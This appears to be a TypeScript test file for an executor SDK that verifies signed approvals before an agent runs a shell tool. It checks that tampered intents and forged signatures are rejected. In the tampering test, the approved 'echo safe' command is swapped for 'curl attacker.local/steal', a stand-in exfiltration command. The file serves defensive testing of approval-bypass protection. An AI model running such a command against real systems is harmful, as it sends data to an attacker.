import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import test from "node:test";

import { createExecutionIntent } from "@manasvi/contracts";
import {
  signApprovedIntentArtifact,
  validateExecutionAuthorization
} from "../../../../packages/executor-sdk/src/index.js";

import { assertApprovalBypassPrevented } from "./oracles.js";

function fixtureApprovedIntent() {
  const now = new Date();
  return createExecutionIntent({
    snapshot: {
      tenantId: "tenant-local",
      workspaceId: "workspace-local",
      actor: { principalType: "human_user", principalId: "user:alice" },
      caller: { principalType: "service", principalId: "service:orchestrator-service" },
      originSessionId: "session:secure-1",
      trace: { traceId: randomUUID(), correlationId: randomUUID() },
      action: {
        actionId: "tool.shell.execute",
        actionClass: "execute",
        operation: "run",
        parameters: { cmd: "echo safe" }
      },
      target: {
        resourceClass: "tool-endpoint",
        resourceId: "tool:shell-command",
        tenantId: "tenant-local",
        workspaceId: "workspace-local",
        attributes: {}
      },
      requiredCapabilities: ["tool.invoke", "approval.required"],
      risk: { score: 80, level: "high", reasons: ["sensitive_action"] },
      policy: {
        decisionId: "decision:approval-required",
        decision: "REQUIRE_APPROVAL",
        approvalRequired: true,
        reasonCodes: ["RULE_REQUIRES_APPROVAL"],
        policySetVersion: "local",
        policySourceRef: "test-policy",
        auditRecordId: "audit:policy"
      },
      createdByService: "orchestrator-service",
      createdAt: now.toISOString(),
      expiresAt: new Date(now.getTime() + 120_000).toISOString(),
      idempotencyKey: "idem:approval-test"
    },
    approval: {
      state: "approved",
      required: true
    },
    lifecycle: "execution_authorized"
  });
}

function fixtureSignedArtifact(intent: ReturnType<typeof fixtureApprovedIntent>) {
  return signApprovedIntentArtifact(
    {
      schemaVersion: "1.0",
      artifactId: "artifact:approval-test",
      intentId: intent.intentId,
      intentVersion: intent.intentVersion,
      intentPayloadHash: intent.payloadHash,
      approvalState: "approved",
      issuedAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 120_000).toISOString(),
      issuedByService: "approval-service",
      approvalRecordId: "approval-record:test",
      policyDecisionId: intent.snapshot.policy.decisionId,
      trace: intent.snapshot.trace,
      tokenVersion: "1.0"
    },
    { keyId: "k1", secret: "approval-secret" }
  );
}

test("[TB-APPROVAL-001][approval] tampered intent payload is rejected", () => {
  const intent = fixtureApprovedIntent();
  const artifact = fixtureSignedArtifact(intent);
  const tamperedIntent = {
    ...intent,
    snapshot: {
      ...intent.snapshot,
      action: {
        ...intent.snapshot.action,
        parameters: { cmd: "curl attacker.local/steal" }
      }
    }
  };
  const result = validateExecutionAuthorization({
    intent: tamperedIntent,
    artifact,
    verificationSecretsByKeyId: { "k1": "approval-secret" }
  });
  assertApprovalBypassPrevented(result, "INTENT_PAYLOAD_HASH_INVALID");
});

test("[TB-APPROVAL-001][approval] forged artifact signature is rejected", () => {
  const intent = fixtureApprovedIntent();
  const artifact = fixtureSignedArtifact(intent);
  const forged = {
    ...artifact,
    signature: {
      ...artifact.signature,
      value: "bad-signature"
    }
  };
  const result = validateExecutionAuthorization({
    intent,
    artifact: forged,
    verificationSecretsByKeyId: { "k1": "approval-secret" }
  });
  assertApprovalBypassPrevented(result, "ARTIFACT_SIGNATURE_INVALID");
});

test("[TB-APPROVAL-001][approval][control] valid approved artifact authorizes execution", () => {
  const intent = fixtureApprovedIntent();
  const artifact = fixtureSignedArtifact(intent);
  const result = validateExecutionAuthorization({
    intent,
    artifact,
    verificationSecretsByKeyId: { "k1": "approval-secret" }
  });
  assert.equal(result.ok, true);
});
